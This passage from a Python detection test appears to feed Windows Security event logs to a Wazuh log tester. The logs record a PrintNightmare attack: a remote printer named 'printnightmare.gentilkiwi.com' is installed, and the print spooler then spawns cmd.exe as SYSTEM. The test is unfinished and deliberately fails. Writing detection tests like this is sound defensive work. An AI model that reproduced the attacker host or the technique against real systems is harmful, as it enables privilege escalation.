            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.7288816Z", "eventRecordID": "2183562", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nSource Handle Information:\n\tSource Handle ID:\t0xa28\n\tSource Process ID:\t0x678\n\nNew Handle Information:\n\tTarget Handle ID:\t0x1644\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "sourceHandleId": "0xa28", "sourceProcessId": "0x678", "targetHandleId": "0x1644", "targetProcessId": "0x4"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.7288872Z", "eventRecordID": "2183563", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1644\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1644", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.7289058Z", "eventRecordID": "2183564", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tFile\n\tObject Name:\t\tC:\\Windows\\INF\\TAPISRV\\0409\n\tHandle ID:\t\t0xa28\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tSYNCHRONIZE\n\t\t\t\tReadData (or ListDirectory)\n\t\t\t\t\n\tAccess Reasons:\t\tSYNCHRONIZE:\tGranted by\tD:(A;;0x1200a9;;;SY)\n\t\t\t\tReadData (or ListDirectory):\tGranted by\tD:(A;;0x1200a9;;;SY)\n\t\t\t\t\n\tAccess Mask:\t\t0x100001\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "objectType": "File", "objectName": "C:\\Windows\\INF\\TAPISRV\\0409", "handleId": "0xa28", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1541\n\t\t\t\t%%4416", "accessReason": "%%1541:\t%%1801\tD:(A;;0x1200a9;;;SY)\n\t\t\t\t%%4416:\t%%1801\tD:(A;;0x1200a9;;;SY)", "accessMask": "0x100001", "restrictedSidCount": "0", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.7289300Z", "eventRecordID": "2183565", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0xa28\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0xa28", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "6416", "version": "1", "level": "0", "task": "13316", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:18.6465659Z", "eventRecordID": "2183566", "processID": "4", "threadID": "848", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new external device was recognized by the system.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nDevice ID:\tSWD\\PRINTENUM\\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}\n\nDevice Name:\t\\\\printnightmare.gentilkiwi.com\\Kiwi Legit Printer\n\nClass ID:\t\t{00000000-0000-0000-0000-000000000000}\n\nClass Name:\t\n\nVendor IDs:\t\n\t\tPRINTENUM\\PrinterConnection\n\t\tgenericgeneric_/_tex8040\n\t\t\n\t\t\n\nCompatible IDs:\t\n\t\tGenPrinterConnection\n\t\tSWD\\GenericRaw\n\t\tSWD\\Generic\n\t\t\n\t\t\n\nLocation Information:\t\n\t\tSpooler Internal"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "deviceId": "SWD\\PRINTENUM\\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}", "deviceDescription": "\\\\printnightmare.gentilkiwi.com\\Kiwi Legit Printer", "classId": "{00000000-0000-0000-0000-000000000000}", "vendorIds": "PRINTENUM\\PrinterConnection\n\t\tgenericgeneric_/_tex8040", "compatibleIds": "GenPrinterConnection\n\t\tSWD\\GenericRaw\n\t\tSWD\\Generic", "locationInformation": "Spooler Internal"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:18.6770256Z", "eventRecordID": "2183567", "processID": "4", "threadID": "848", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x500\n\tNew Process Name:\tC:\\Windows\\System32\\drvinst.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-16384\n\tCreator Process ID:\t0x280\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\n\tProcess Command Line:\tDrvInst.exe \"1\" \"0\" \"SWD\\PRINTENUM\\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}\" \"\" \"\" \"4f51462e7\" \"0000000000000000\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "newProcessId": "0x500", "newProcessName": "C:\\Windows\\System32\\drvinst.exe", "tokenElevationType": "%%1936", "processId": "0x280", "commandLine": "DrvInst.exe \"1\" \"0\" \"SWD\\PRINTENUM\\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}\" \"\" \"\" \"4f51462e7\" \"0000000000000000\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\svchost.exe", "mandatoryLabel": "S-1-16-16384"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "6416", "version": "1", "level": "0", "task": "13316", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:19.0725079Z", "eventRecordID": "2183568", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new external device was recognized by the system.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nDevice ID:\tSWD\\PRINTENUM\\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}\n\nDevice Name:\t\\\\printnightmare.gentilkiwi.com\\Kiwi Legit Printer\n\nClass ID:\t\t{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\n\nClass Name:\tPrintQueue\n\nVendor IDs:\t\n\t\tPRINTENUM\\PrinterConnection\n\t\tgenericgeneric_/_tex8040\n\t\t\n\t\t\n\nCompatible IDs:\t\n\t\tGenPrinterConnection\n\t\tSWD\\GenericRaw\n\t\tSWD\\Generic\n\t\t\n\t\t\n\nLocation Information:\t\n\t\tSpooler Internal"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "deviceId": "SWD\\PRINTENUM\\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}", "deviceDescription": "\\\\printnightmare.gentilkiwi.com\\Kiwi Legit Printer", "classId": "{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}", "className": "PrintQueue", "vendorIds": "PRINTENUM\\PrinterConnection\n\t\tgenericgeneric_/_tex8040", "compatibleIds": "GenPrinterConnection\n\t\tSWD\\GenericRaw\n\t\tSWD\\Generic", "locationInformation": "Spooler Internal"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:21.6314909Z", "eventRecordID": "2183569", "processID": "4", "threadID": "6208", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x8cc\n\tNew Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-16384\n\tCreator Process ID:\t0x678\n\tCreator Process Name:\tC:\\Windows\\System32\\spoolsv.exe\n\tProcess Command Line:\t\"cmd.exe\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "newProcessId": "0x8cc", "newProcessName": "C:\\Windows\\System32\\cmd.exe", "tokenElevationType": "%%1936", "processId": "0x678", "commandLine": "\"cmd.exe\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\spoolsv.exe", "mandatoryLabel": "S-1-16-16384"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:21.6740688Z", "eventRecordID": "2183570", "processID": "4", "threadID": "6208", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x9bc\n\tNew Process Name:\tC:\\Windows\\System32\\conhost.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-16384\n\tCreator Process ID:\t0x8cc\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\t\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "newProcessId": "0x9bc", "newProcessName": "C:\\Windows\\System32\\conhost.exe", "tokenElevationType": "%%1936", "processId": "0x8cc", "commandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-16384"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")
